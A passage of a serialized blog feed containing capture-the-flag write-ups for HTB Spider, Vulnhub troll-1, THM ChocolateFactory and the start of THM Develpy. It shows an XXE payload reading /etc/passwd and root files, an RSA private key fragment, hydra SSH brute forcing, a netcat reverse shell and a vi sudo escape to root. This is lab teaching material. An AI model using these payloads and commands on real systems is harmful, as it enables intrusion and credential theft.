xDCO\\nJjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW\\nK1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv\\nhm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ\\nmQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8\\ngu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb\\n0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2\\nnfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W\\nCeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG\\nrbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO\\nTTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6\\nIleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==\\n-----END RSA PRIVATE KEY-----\\n```\\n\\n--\x3e And i also found that there is a port `8080` running internally and i found it using `netstat -anp` command\\n\\n![](Attachments/Pastedimage20211107104452.png)\\n\\n--\x3e So let\'s forward this port and let\'s see what we get !\\n\\n## XML entity injection\\n\\nAnd i found this beta login page\\n\\n![](Attachments/Pastedimage20211108120028.png)\\n\\nso Let\'s login as `admin` user witout giving password\\n\\n--\x3e and we got logged in !\\n\\n![](Attachments/Pastedimage20211108120130.png)\\n\\n--\x3e After some searching i found this cookies which looks weird\\n\\n```\\n.eJxNjEFvgyAARv_KwnkH7WqTmexiAG03cKCActPRBC1as5HU2fS_z16aHb-8770rcPPgQHwFTy2IgUAUGzSX7HSQXPlRDqE6KvLbZrprBN6W6ZQYEUJWcSIh_xDIvpthv4jCw5WPhaBJjqeM94m-8_vWgYNMmQML0FZjm7cp9VTZTobiW0lTmBRXFFpCQr1Tbu1JVxE1M715Hf_7PLOXekFRs_ZJlXRNz18EItFXSuZc2YYv-FIP56B4_M1GnUxKsBMUecYWF9X9PiI4GT_L4A3cnsF07kb_A-Lg9gfxF1a8.YYlYJQ.cq3IvEiTsuVC9kD_QCCpldA_qHQ\\n```\\n\\n--\x3e Let\'s decode it with `flask-unsign`\\n\\n```bash\\nflask-unsign --deocde --cookie <cookie>\\n```\\n\\n--\x3e After decoding it i got this :\\n\\n```\\n{\'lxml\': b\'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+YWRtaW48L3VzZXJuYW1lPgogICAgICAgIDxpc19hZG1pbj4wPC9pc19hZG1pbj4KICAgIDwvZGF0YT4KPC9yb290Pg==\', \'points\': 0}\\n```\\n\\n--\x3e Let\'s decode value of `lxml` which looks `base64` because of `=` at the end\\n\\n--\x3e and we have `XML` data !\\n\\n![](Attachments/Pastedimage20211108121618.png)\\n\\n--\x3e So let\'s try `xml entity injection` payloads after intercepting the request\\n\\ni found this payload :\\n\\n```bash\\n<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY test SYSTEM \'file:///etc/passwd\'>]><root>&test;</root>\\n```\\n\\n--\x3e But for that we have to login as `&admin;` because the payload requires it\\n\\n#### but wait where we will inject this payload ?\\n\\n--\x3e So for that let\'s intercept the login request\\n\\nand this is what i got :\\n\\n```bash\\nPOST /login HTTP/1.1\\nHost: localhost:8000\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\nAccept-Language: en-US,en;q=0.5\\nAccept-Encoding: gzip, deflate\\nContent-Type: application/x-www-form-urlencoded\\nContent-Length: 34\\nOrigin: http://localhost:8000\\nConnection: close\\nReferer: http://localhost:8000/login\\nCookie: __test=1; session=eyJwb2ludHMiOjB9.YYldfw.MlhlWFVe5ZLZX9fJ1u3Kr3CV5cI\\nUpgrade-Insecure-Requests: 1\\n\\nusername=%26admin%3B&version=1.0.0\\n```\\n\\n--\x3e Here there are 2 parameters `username` and `version` and i found that `version` is reflecting in first tags in `xml` and `username` is reflecting between `<username></username>` so we have to inject the payload in `version` because `<!DOCTYPE>` must be at first tag\\n\\nso my payload is looking like this :\\n\\n```bash\\nvalue=1.0.2--\x3e<!DOCTYPE root [<!ENTITY admin SYSTEM \'file:///etc/passwd\'>]>\x3c!--\\n```\\n\\nso now `xml` look like this :\\n\\n```bash\\n<!API version 1.0.2--\x3e<!DOCTYPE root [<!ENTITY admin SYSTEM \'file:///etc/passwd\'>]>\x3c!----\x3e\\n#and other stuff after this\\n```\\n\\n--\x3e and boom we got content of `/etc/passwd` !\\n\\n![](Attachments/Pastedimage20211108123051.png)\\n\\n--\x3e So now let\'s read the flag which is in `/root/root.txt`\\n\\n--\x3e and boom we got the root flag !\\n\\n![](Attachments/Pastedimage20211108123443.png)\\n\\n```bash\\nc208888f258c21bfdf59c8d4099fd3a1\\n```\\n\\n--\x3e If you need better shell then just grab the `id_rsa` and get the ssh shell\\n\\n![](Attachments/Pastedimage20211108124059.png)\\n\\n---\\n\\n## Resources\\n\\n- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection\\n- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"},{"id":"troll-1","metadata":{"permalink":"/Cybernotes/blog/troll-1","source":"@site/blog/2022-02-27-troll1/index.md","title":"Vulnhub troll-1 writeup","description":"writeup of troll-1 machine from vulnhub","date":"2022-02-27T00:00:00.000Z","formattedDate":"February 27, 2022","tags":[{"label":"wireshark","permalink":"/Cybernotes/blog/tags/wireshark"},{"label":"hydra","permalink":"/Cybernotes/blog/tags/hydra"},{"label":"strings","permalink":"/Cybernotes/blog/tags/strings"},{"label":"kernel","permalink":"/Cybernotes/blog/tags/kernel"}],"readingTime":2.855,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"troll-1","title":"Vulnhub troll-1 writeup","description":"writeup of troll-1 machine from vulnhub","authors":["shivam"],"image":"/img/Vulnhub/troll-1.jpg","tags":["wireshark","hydra","strings","kernel"]},"prevItem":{"title":"HTB Spider writeup","permalink":"/Cybernotes/blog/spider"},"nextItem":{"title":"THM ChocolateFactory","permalink":"/Cybernotes/blog/chocolateFactory"}},"content":"Hello everyone,\\n\\nToday we are going to solve troll-1 machine from vulnhub. This machine is full of rabbit holes and you have to think like noob xD. we will learn about\\nwireshark,hydra and linux kernel privilege escalation\\n\\n![](/img/Vulnhub/troll-1.jpg)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```bash\\nPORT STATE SERVICE VERSION\\n21/tcp open ftp vsftpd 3.0.2\\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\\n|_-rwxrwxrwx 1 1000 0 8068 Aug 10 2014 lol.pcap [NSE: writeable]\\n| ftp-syst:\\n| STAT:\\n| FTP server status:\\n| Connected to 10.0.2.15\\n| Logged in as ftp\\n| TYPE: ASCII\\n| No session bandwidth limit\\n| Session timeout in seconds is 600\\n| Control connection is plain text\\n| Data connections will be plain text\\n| At session startup, client count was 2\\n| vsFTPd 3.0.2 - secure, fast, stable\\n|\\\\_End of status\\n22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n| 1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)\\n| 2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)\\n| 256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)\\n|_ 256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)\\n80/tcp open http Apache httpd 2.4.7 ((Ubuntu))\\n| http-robots.txt: 1 disallowed entry\\n|\\\\_/secret\\n|\\\\_http-server-header: Apache/2.4.7 (Ubuntu)\\n|\\\\_http-title: Site doesn\'t have a title (text/html).\\nMAC Address: 08:00:27:CE:7F:DC (Oracle VirtualBox virtual NIC)\\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\\n```\\n\\n## dirsearch results\\n\\n```bash\\n[08:55:48] 200 - 36B - /index.html\\n[08:55:50] 200 - 31B - /robots.txt\\n[08:55:50] 301 - 306B - /secret -> http://10.0.2.17/secret/ > [08:55:50] 403 - 289B - /server-status\\n```\\n\\n## basic enumration\\n\\n--\x3e got this in /robots.txt\\n\\n```js\\nUser-agent:*\\nDisallow: /secret\\n```\\n\\n--\x3e got this in /secret directory\\n\\n![](Attachments/Pastedimage20210703090555.png)\\n\\n--\x3e also FTP anonymous login allowed so i went there and found one file called `lol.pcap`\\n\\n--\x3e found many packets in that file but i found one interesting file called **secret_stuff.txt**\\n\\n![](Attachments/Pastedimage20210703093614.png)\\n\\n--\x3e i also found one directory called **sup3rscr3tdirlol **\\n\\n--\x3e i found one file in this directory\\n\\n![](Attachments/Pastedimage20210703093723.png)\\n\\n---\\n\\n## More enumration\\n\\n--\x3e i done **strings roflmao** and found that it\'s running a C file so Let\'s try to locate it!\\n\\n![](Attachments/Pastedimage20210703094313.png)\\n\\n--\x3e i fount this word **0x0856BF** in that file when i executed it and i tried to decode it but it was actully a directory !\\n\\n![](Attachments/Pastedimage20210703095009.png)\\n\\n--\x3e it\'s a directory\\n\\n![](Attachments/Pastedimage20210703100105.png)\\n\\n---\\n\\n## brute force\\n\\n==> i found this in **pass.txt** file :\\n\\n```js\\nGood_job_:)\\n```\\n\\n==> i found this in **which_one_lol.txt** file:\\n\\n```js\\nmaleus\\nps-aux\\nfelux\\nEagle11\\ngenphlux < -- Definitely not this one\\nusmc8892\\nblawrg\\nwytshadow\\nvis1t0r\\noverflow\\n```\\n\\n--\x3e i tried this above password for all the users using hydra but i didn\'t get any results\\n\\n==> so for this part i had to see a writeup and actully the password was the name of password file itself which was **Pass.txt** xD\\n\\n--\x3e so i brute forced this password for all users using command:\\n\\n```js\\nhydra -L users.txt -P pass.txt <ip> ssh\\n```\\n\\n![](Attachments/Pastedimage20210703104504.png)\\n\\n--\x3e and we got ssh shell !\\n--\x3eLet\'s escalate our privilleges !\\n\\n---\\n\\n## privesc\\n\\n--\x3e i tried to do **sudo -l** but permission was denied so i tried to find some SUID bits but there was not any .\\n\\n--\x3e at last i run linpeas and found linux kernel vulnerable !\\n\\n![](Attachments/Pastedimage20210703112317.png)\\n\\n--\x3e and also i only have write permission in **/tmp**\\n\\n==> so Let\'s search exploit for this !\\n\\n--\x3e and i found one on exploit-db\\n\\n![](Attachments/Pastedimage20210703112441.png)\\n\\n--\x3e so Let\'s download it in victim machine and execute it !\\n\\n```c\\ngcc exploit.c\\n./a.out\\n```\\n\\n--\x3e and i got `root` shell !\\n\\n![](Attachments/Pastedimage20210703111916.png)\\n\\n---"},{"id":"chocolateFactory","metadata":{"permalink":"/Cybernotes/blog/chocolateFactory","source":"@site/blog/2022-02-26-Chocolatefactory/index.md","title":"THM ChocolateFactory","description":"Tryhackme chocolate factory room writeup","date":"2022-02-26T00:00:00.000Z","formattedDate":"February 26, 2022","tags":[{"label":"FTP","permalink":"/Cybernotes/blog/tags/ftp"},{"label":"vi","permalink":"/Cybernotes/blog/tags/vi"},{"label":"id_rsa","permalink":"/Cybernotes/blog/tags/id-rsa"}],"readingTime":5.755,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"chocolateFactory","tags":["FTP","vi","id_rsa"],"authors":["shivam"],"title":"THM ChocolateFactory","description":"Tryhackme chocolate factory room writeup","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/e2eed78e92b4890174e0a2510b6e7a7c.jpeg"},"prevItem":{"title":"Vulnhub troll-1 writeup","permalink":"/Cybernotes/blog/troll-1"},"nextItem":{"title":"THM Develpy writeup","permalink":"/Cybernotes/blog/develpy"}},"content":"Hello everyone,\\n\\nToday we are going to solve the chocolate factory machine from tryhackme. we will see how we can enumrate FTP,SSH and how to do privesc with vi.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/e2eed78e92b4890174e0a2510b6e7a7c.jpeg)\\n\\n\x3c!--truncate--\x3e\\n\\nSo let\'s start..\\n\\n## Nmap results\\n\\n```bash\\nPORT    STATE SERVICE    VERSION\\n21/tcp  open  ftp        vsftpd 3.0.3\\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\\n|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg\\n| ftp-syst:\\n|   STAT:\\n| FTP server status:\\n|      Connected to ::ffff:10.9.10.10\\n|      Logged in as ftp\\n|      TYPE: ASCII\\n|      No session bandwidth limit\\n|      Session timeout in seconds is 300\\n|      Control connection is plain text\\n|      Data connections will be plain text\\n|      At session startup, client count was 2\\n|      vsFTPd 3.0.3 - secure, fast, stable\\n|_End of status\\n22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\\n| ssh-hostkey:\\n|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)\\n|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)\\n|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)\\n80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))\\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\\n|_http-server-header: Apache/2.4.29 (Ubuntu)\\n|_http-title: Site doesn\'t have a title (text/html).\\n100/tcp open  newacct?\\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\\n| fingerprint-strings:\\n|   GenericLines, NULL:\\n|     \\"Welcome to chocolate room!!\\n|     ___.---------------.\\n|     .\'__\'__\'__\'__\'__,` . ____ ___ \\\\r\\n|     _:\\\\x20 |:. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\'__\'_`.__| `. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\\\\x20__\'_;-----------------`\\n|     \\\\|______________________;________________|\\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\\n|_    hope you wont drown Augustus\\"\\n106/tcp open  pop3pw?\\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\\n| fingerprint-strings:\\n|   GenericLines, NULL:\\n|     \\"Welcome to chocolate room!!\\n|     ___.---------------.\\n|     .\'__\'__\'__\'__\'__,` . ____ ___ \\\\r\\n|     _:\\\\x20 |:. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\'__\'_`.__| `. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\\\\x20__\'_;-----------------`\\n|     \\\\|______________________;________________|\\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\\n|_    hope you wont drown Augustus\\"\\n109/tcp open  pop2?\\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\\n| fingerprint-strings:\\n|   GenericLines, NULL:\\n|     \\"Welcome to chocolate room!!\\n|     ___.---------------.\\n|     .\'__\'__\'__\'__\'__,` . ____ ___ \\\\r\\n|     _:\\\\x20 |:. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\'__\'_`.__| `. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\\\\x20__\'_;-----------------`\\n|     \\\\|______________________;________________|\\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\\n|_    hope you wont drown Augustus\\"\\n110/tcp open  pop3?\\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\\n| fingerprint-strings:\\n|   GenericLines, NULL:\\n|     \\"Welcome to chocolate room!!\\n|     ___.---------------.\\n|     .\'__\'__\'__\'__\'__,` . ____ ___ \\\\r\\n|     _:\\\\x20 |:. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\'__\'_`.__| `. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\\\\x20__\'_;-----------------`\\n|     \\\\|______________________;________________|\\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\\n|_    hope you wont drown Augustus\\"\\n111/tcp open  rpcbind?\\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\\n| fingerprint-strings:\\n|   NULL, RPCCheck:\\n|     \\"Welcome to chocolate room!!\\n|     ___.---------------.\\n|     .\'__\'__\'__\'__\'__,` . ____ ___ \\\\r\\n|     _:\\\\x20 |:. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\'__\'_`.__| `. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\\\\x20__\'_;-----------------`\\n|     \\\\|______________________;________________|\\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\\n|_    hope you wont drown Augustus\\"\\n113/tcp open  ident?\\n| fingerprint-strings:\\n|   DNSVersionBindReqTCP, GenericLines, GetRequest, NULL, RTSPRequest, TLSSessionReq, ms-sql-s:\\n|_    http://localhost/key_rev_key <- You will find the key here!!!\\n119/tcp open  nntp?\\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\\n| fingerprint-strings:\\n|   GenericLines, NULL:\\n|     \\"Welcome to chocolate room!!\\n|     ___.---------------.\\n|     .\'__\'__\'__\'__\'__,` . ____ ___ \\\\r\\n|     _:\\\\x20 |:. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\'__\'_`.__| `. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\\\\x20__\'_;-----------------`\\n|     \\\\|______________________;________________|\\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\\n|_    hope you wont drown Augustus\\"\\n125/tcp open  locus-map?\\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\\n| fingerprint-strings:\\n|   GenericLines, NULL:\\n|     \\"Welcome to chocolate room!!\\n|     ___.---------------.\\n|     .\'__\'__\'__\'__\'__,` . ____ ___ \\\\r\\n|     _:\\\\x20 |:. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\'__\'_`.__| `. \\\\x20 ___ \\\\r\\n|     \\\\\'__\'__\'__\\\\x20__\'_;-----------------`\\n|     \\\\|______________________;________________|\\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\\n|_    hope you wont drown Augustus\\"\\n```\\n\\n## FTP\\n\\n--\x3e I got this image file on ftp\\n\\n![[Pasted image 20211226115707.png]]\\n\\nBut i found nothing in that image so we have to do something else.\\n\\n## Enumration\\n\\n--\x3e I found this login page on port `80`\\n\\n![](Attachments/Pastedimage20211226123439.png)\\n\\n--\x3e After that i brute forced it with some extensions like `php`,`js` and `html` with the help of gobuster and i found the `/home.php` page\\n\\n```bash\\n===============================================================\\n/.htpasswd.js         (Status: 403) [Size: 278]\\n/.htaccess            (Status: 403) [Size: 278]\\n/.htpasswd.html       (Status: 403) [Size: 278]\\n/.htaccess.php        (Status: 403) [Size: 278]\\n/.htpasswd            (Status: 403) [Size: 278]\\n/.htaccess.js         (Status: 403) [Size: 278]\\n/.htpasswd.php        (Status: 403) [Size: 278]\\n/.htaccess.html       (Status: 403) [Size: 278]\\n/home.php             (Status: 200) [Size: 569]\\n/index.html           (Status: 200) [Size: 1466]\\n/server-status        (Status: 403) [Size: 278]\\n/validate.php         (Status: 200) [Size: 93]\\n===============================================================\\n```\\n\\n--\x3e After going to that directory i found that there is a one input field which is executing the commands so i tried to add netcat reverse shell and i got the reverse shell !\\n\\n![](Attachments/Pastedimage20211226125200.png)\\n\\n--\x3e Also i found one sentence in nmap results which looks like this:\\n\\n![](Attachments/Pastedimage20211226125244.png)\\n\\n--\x3e So i tried to go in `http://ip/key_rev_key` and found one file !\\n\\nI have given all permissions (777) to this file and when i ran it i found this:\\n\\n![](Attachments/Pastedimage20211226131120.png)\\n\\n--\x3e so i ran `strings` on this file and found the key !\\n\\n![](Attachments/Pastedimage20211226131743.png)\\n\\n--\x3e So now let\'s continue with the reverse shell which we have found !\\n\\nAnd i found the `id_rsa` key for the user `charlie` in `/home/charlie/teleport` so let\'s grab that and give it `600` permission and login as charlie!\\n\\n```bash\\nchmod 600 id_rsa\\nssh -i id_rsa charlie@id_rsa\\n```\\n\\n--\x3e And we got logged in as `charlie` and found the `user` flag!\\n\\nAnd also we missed this question !\\n\\n> What is Charlie\'s password?\\n\\nSo i found it in `validate.php` file inside `/var/www/html/`\\n\\n![](Attachments/Pastedimage20211226132341.png)\\n\\n--\x3e And now let\'s continue with the privesc part!\\n\\n## Privesc\\n\\nFirst of all i done `sudo -l` and found that we can run `/usr/bin/vi` as root so let\'s goto gtfobins and find command to privesc\\n\\nand i found this command:\\n\\n```bash\\nsudo /usr/bin/vi -c \':!/bin/sh\' /dev/null\\n```\\n\\n--\x3e And boom i got root !\\n\\nso let\'s get the `root` flag but wait i found one file there called `root.py` so we are not done yet!\\n\\nWhen i have cat that file i found that it\'s getting key from user and decoding something:\\n\\n```py\\nimport pyfiglet\\nkey=input(\\"Enter the key:  \\")\\nf=Fernet(key)\\nencrypted_mess= \'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAA\\nKyJQDHNvQaJ\'\\ndcrypt_mess=f.decrypt(encrypted_mess)\\nmess=dcrypt_mess.decode()\\ndisplay1=pyfiglet.figlet_format(\\"You Are Now The Owner Of \\")\\ndisplay2=pyfiglet.figlet_format(\\"Chocolate Factory \\")\\nprint(display1)\\nprint(display2)\\n```\\n\\nSo i remembered that we found one key earlier so let\'s use it at the place of `key` variable here and i done something like this:\\n\\n![](Attachments/Pastedimage20211226132802.png)\\n\\n--\x3e So let\'s run that python file with `python root.py` and i got my flag !\\n\\n![](Attachments/Pastedimage20211226133446.png)\\n\\n--\x3e And we have pwned the machine!"},{"id":"develpy","metadata":{"permalink":"/Cybernotes/blog/develpy","source":"@site/blog/2022-02-26-Develpy/index.md","title":"THM Develpy writeup","description":"Tryhackme develpy room writeup","date":"2022-02-26T00:00:00.000Z","formattedDate":"February 26, 2022","tags":[{"label":"python","permalink":"/Cybernotes/blog/tags/python"},{"label":"crontab","permalink":"/Cybernotes/blog/tags/crontab"},{"label":"command injection","permalink":"/Cybernotes/blog/tags/command-injection"}],"readingTime":2.645,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"develpy","title":"THM Develpy writeup","description":"Tryhackme develpy room writeup","authors":["shivam"],"image":"https://tryhackme-images.s3.amazonaws.com/room-icons/47bd9da3ef003a03478334c93013fd3a.png","tags":["python","crontab","command injection"]},"prevItem":{"title":"THM ChocolateFactory","permalink":"/Cybernotes/blog/chocolateFactory"},"nextItem":{"title":"THM Gamingserver writeup","permalink":"/Cybernotes/blog/gamingserver"}},"content":"Hello everyone,\\n\\nToday we are going to solve develpy from Tryhackme. we will see python command injection and privilege escalation with crontab.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/47bd9da3ef003a03478334c93013fd3a.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```c\\nPORT      STATE SERVICE           VERSION\\n22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)\\n|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)\\n|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)\\n10000/tcp open  snet-sensor-mgmt?\\n| fingerprint-strings:\\n|   GenericLines:\\n|     Private 0days\\n|     Please enther number of exploits to send??: Traceback (most recent call last):\\n|     File \\"./exploit.py\\", line 6, in <module>\\n|     num_exploits = int(input(\' Please enther number of exploits to send??: \'))\\n|     File \\"<string>\\", line 0\\n|     SyntaxError: unexpected EOF while parsing\\n|   GetRequest:\\n|     Private 0days\\n|     Please enther number of exploits to send??: Traceback (most recent call last):\\n|     File \\"./exploit.py\\", line 6, in <module>\\n|     num_exploits = int(input(\' Please enther number of exploits to send??: \'))\\n|     File \\"<string>\\", line 1, in <module>\\n|     NameError: name \'GET\' is not defined\\n|   HTTPOptions, RTSPRequest:\\n|     Private 0days\\n|     Please enther number of exploits to send??: Traceback (most recent call last):\\n|     File \\"./exploit.py\\", line 6, in <module>\\n|     num_exploits = int(input(\' Please enther number of exploits to send??: \'))\\n|     File \\"<string>\\", line 1, in <module>\\n|     NameError: name \'OPTIONS\' is not defined\\n|   NULL:\\n|     Private 0days\\n|_    Please enther number of exploits to send??:\\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\\nSF-Port10000-TCP:V=7.91%I=7%D=9/3%Time=6132570A%P=x86_64-pc-linux-gnu%r(NU\\nSF:LL,48,\\"\\\\r\\\\n\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20Private\\\\x200days\\\\r\\\\n\\\\r\\\\n\\\\x20\\nSF:Please\\\\x20enther\\\\x20number\\\\x20of\\\\x20exploits\\\\x20to\\\\x20send\\\\?\\\\?:\\\\x20\\")%r\\nSF:(GetRequest,136,\\"\\\\r\\\\n\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20Private\\\\x200days\\\\r\\nSF:\\\\n\\\\r\\\\n\\\\x20Please\\\\x20enther\\\\x20number\\\\x20of\\\\x20exploits\\\\x20to\\\\x20send\\\\?\\\\\\nSF:?:\\\\x20Traceback\\\\x20\\\\(most\\\\x20recent\\\\x20call\\\\x20last\\\\):\\\\r\\\\n\\\\x20\\\\x20File\\\\\\nSF:x20\\\\\\"\\\\./exploit\\\\.py\\\\\\",\\\\x20line\\\\x206,\\\\x20in\\\\x20<module>\\\\r\\\\n\\\\x20\\\\x20\\\\x20\\\\\\nSF:x20num_exploits\\\\x20=\\\\x20int\\\\(input\\\\(\'\\\\x20Please\\\\x20enther\\\\x20number\\\\x20\\nSF:of\\\\x20exploits\\\\x20to\\\\x20send\\\\?\\\\?:\\\\x20\'\\\\)\\\\)\\\\r\\\\n\\\\x20\\\\x20File\\\\x20\\\\\\"<string\\nSF:>\\\\\\",\\\\x20line\\\\x201,\\\\x20in\\\\x20<module>\\\\r\\\\nNameError:\\\\x20name\\\\x20\'GET\'\\\\x20\\nSF:is\\\\x20not\\\\x20defined\\\\r\\\\n\\")%r(HTTPOptions,13A,\\"\\\\r\\\\n\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\\\nSF:x20\\\\x20\\\\x20Private\\\\x200days\\\\r\\\\n\\\\r\\\\n\\\\x20Please\\\\x20enther\\\\x20number\\\\x20of\\nSF:\\\\x20exploits\\\\x20to\\\\x20send\\\\?\\\\?:\\\\x20Traceback\\\\x20\\\\(most\\\\x20recent\\\\x20cal\\nSF:l\\\\x20last\\\\):\\\\r\\\\n\\\\x20\\\\x20File\\\\x20\\\\\\"\\\\./exploit\\\\.py\\\\\\",\\\\x20line\\\\x206,\\\\x20in\\nSF:\\\\x20<module>\\\\r\\\\n\\\\x20\\\\x20\\\\x20\\\\x20num_exploits\\\\x20=\\\\x20int\\\\(input\\\\(\'\\\\x20P\\nSF:lease\\\\x20enther\\\\x20number\\\\x20of\\\\x20exploits\\\\x20to\\\\x20send\\\\?\\\\?:\\\\x20\'\\\\)\\\\)\\nSF:\\\\r\\\\n\\\\x20\\\\x20File\\\\x20\\\\\\"<string>\\\\\\",\\\\x20line\\\\x201,\\\\x20in\\\\x20<module>\\\\r\\\\nNa\\nSF:meError:\\\\x20name\\\\x20\'OPTIONS\'\\\\x20is\\\\x20not\\\\x20defined\\\\r\\\\n\\")%r(RTSPReque\\nSF:st,13A,\\"\\\\r\\\\n\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20Private\\\\x200days\\\\r\\\\n\\\\r\\\\n\\\\x2\\nSF:0Please\\\\x20enther\\\\x20number\\\\x20of\\\\x20exploits\\\\x20to\\\\x20send\\\\?\\\\?:\\\\x20Tra\\nSF:ceback\\\\x20\\\\(most\\\\x20recent\\\\x20call\\\\x20last\\\\):\\\\r\\\\n\\\\x20\\\\x20File\\\\x20\\\\\\"\\\\./e\\nSF:xploit\\\\.py\\\\\\",\\\\x20line\\\\x206,\\\\x20in\\\\x20<module>\\\\r\\\\n\\\\x20\\\\x20\\\\x20\\\\x20num_ex\\nSF:ploits\\\\x20=\\\\x20int\\\\(input\\\\(\'\\\\x20Please\\\\x20enther\\\\x20number\\\\x20of\